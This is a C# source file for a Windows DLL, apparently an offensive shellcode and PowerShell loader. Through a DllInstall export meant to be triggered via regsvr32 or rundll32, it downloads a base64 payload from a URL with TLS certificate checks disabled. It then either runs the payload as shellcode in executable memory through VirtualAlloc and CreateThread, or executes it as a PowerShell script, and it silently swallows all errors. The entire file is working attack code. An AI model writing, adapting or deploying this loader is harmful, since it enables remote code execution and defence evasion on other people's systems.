using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Net;
using RGiesecke.DllExport;

namespace Export
{
    public class wve
    {
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_SIZE = 8192;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize, uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [DllImport("kernel32", SetLastError = true)]
        private static extern UInt32 WaitForSingleObject(
           IntPtr hHandle,
           UInt32 dwMilliseconds
        );

        //rundll32 entry point
        [DllExport("EntryPoint", CallingConvention = CallingConvention.StdCall)]
        public static bool EntryPoint(IntPtr hwnd, IntPtr hinst, string cmdline, int nCmdShow)
        {
            return true;
        }

        [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
        public static bool DllRegisterServer()
        {
            return true;
        }

        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
        public static bool DllUnregisterServer()
        {
            return true;
        }

        [DllExport("DllInstall", CallingConvention = CallingConvention.StdCall)]
        public static void DllInstall(bool flag, IntPtr cmdline)
        {
            IntPtr hThread = IntPtr.Zero;
            IntPtr pinfo = IntPtr.Zero;
            UInt32 tid = 0;
            char[] separator = { ',' };

            try
            {
                string newcmdline = Marshal.PtrToStringUni(cmdline);
                string payload_type = newcmdline.Split(separator)[0].ToLower();
                string filename = newcmdline.Split(separator)[1];

                Regex rexp = new Regex(
                    @"^(?<url>https?://(?:[a-z0-9-]+\.)+[a-z0-9]+(?::\d{1,5})?/.+)",
                    RegexOptions.IgnoreCase
                );
                MatchCollection m = rexp.Matches(filename);
                string b64_payload = "";
                if (m.Count > 0)
                {
                    GroupCollection group = m[0].Groups;
                    WebClient wc = new WebClient();
                    // disable SSL/TLS certificate validation
                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    b64_payload = wc.DownloadString(group["url"].Value);
                }
                else
                {
                    b64_payload = System.IO.File.ReadAllText(filename);
                }
                byte[] payload = Convert.FromBase64String(b64_payload);

                if (payload_type == "shellcode")
                {
                    IntPtr newbuf = VirtualAlloc(IntPtr.Zero, MEM_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(payload, 0, (IntPtr)(newbuf), payload.Length);
                    hThread = CreateThread(0, 0, newbuf, pinfo, 0, ref tid);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);
                }
                else if (payload_type == "powershell")
                {
                    // sometimes the script might be unicode
                    // we need to make sure its ASCII before passing into pipeline.
                    string ps_payload = "";
                    if (Encoding.Unicode.GetByteCount(payload.ToString()) > 0)
                    {
                        ps_payload = Encoding.ASCII.GetString(
                            Encoding.Convert(
                                Encoding.Unicode, Encoding.ASCII, payload
                            )
                        );
                    }
                    else
                    {
                        ps_payload = Encoding.ASCII.GetString(payload);
                    }

                    RunspaceConfiguration rconf = RunspaceConfiguration.Create();
                    Runspace rs = RunspaceFactory.CreateRunspace(rconf);
                    rs.Open();
                    Pipeline pipeline = rs.CreatePipeline();
                    pipeline.Commands.AddScript(ps_payload);
                    pipeline.Invoke();
                    rs.Close();
                }
            }
            catch { }
        }
    }
}
